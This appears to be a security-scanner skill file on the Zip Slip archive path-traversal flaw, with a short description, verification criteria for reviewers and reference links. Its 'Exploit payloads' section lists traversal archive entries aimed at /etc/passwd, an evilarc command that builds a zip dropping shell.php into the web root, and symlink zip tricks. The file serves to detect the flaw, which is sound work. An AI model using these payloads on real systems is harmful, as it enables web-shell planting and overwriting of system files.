# Zip Slip — @archghost skill
> cats: (advisory — no static taint rule yet) · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information.

## Exploit payloads (from PayloadsAllTheThings)
- `malicious.zip`
- `├── ../../../../etc/passwd`
- `├── ../../../../usr/local/bin/malicious_script.sh`
- `python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15`
- `ln -s ../../../index.php symindex.txt`
- `zip --symlinks test.zip symindex.txt`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Zip%20Slip
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Zip%20Slip
- HackTricks Cloud: https://cloud.hacktricks.wiki/
